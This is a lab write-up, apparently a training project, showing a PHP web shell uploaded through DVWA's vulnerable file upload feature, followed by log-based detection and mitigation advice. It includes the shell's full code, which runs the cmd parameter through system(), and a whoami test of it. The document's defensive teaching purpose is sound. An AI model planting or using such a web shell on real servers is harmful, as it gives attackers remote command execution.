*Web Shell Upload Detection using DVWA and Apache Logs*
*Project Overview*

This project demonstrates how an unrestricted file upload vulnerability can allow an attacker to upload a PHP web shell to a vulnerable web application. After uploading the file, web server logs were analyzed from a SOC analyst's perspective to identify indicators of compromise (IOCs) and understand the attack sequence.

*Objective*
Understand unrestricted file upload vulnerabilities.
Simulate a web shell upload in a controlled lab.
Analyze Apache access logs.
Identify suspicious activity.
Document IOCs.
Recommend mitigation and detection strategies.

Attack Scenario

*The vulnerable File Upload functionality in DVWA was used to upload a PHP web shell.*

*Uploaded file:*

<?php
echo "<h2>DVWA Upload Test</h2>";

if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>

The uploaded file was successfully stored inside:

/DVWA/hackable/uploads/
Attack Execution
Step 1

Uploaded:

shell.php

Result:

Upload Successful
Step 2

Accessed:

http://localhost/DVWA/hackable/uploads/shell.php

Output:

DVWA Upload Test
Step 3

Executed:

http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami

Output:

www-data

This demonstrated that commands supplied through the cmd parameter were executed by the web server process.

In this lab, the uploaded PHP script accepted user input and executed operating system commands. This demonstrates how a vulnerable upload feature can be abused to run commands on the server.

Detection Opportunities

A SOC analyst could monitor for:

Execution of .php files from upload directories.
Requests containing suspicious query parameters such as cmd=.
Repeated access to newly uploaded executable files.
Unexpected server-side files appearing in upload folders.
Mitigation Recommendations
Allow only approved file extensions.
Verify MIME types on the server side.
Rename uploaded files.
Store uploads outside the web root.
Disable execution of scripts inside upload directories.
Deploy a Web Application Firewall (WAF).
Monitor upload directories for unauthorized executable files.
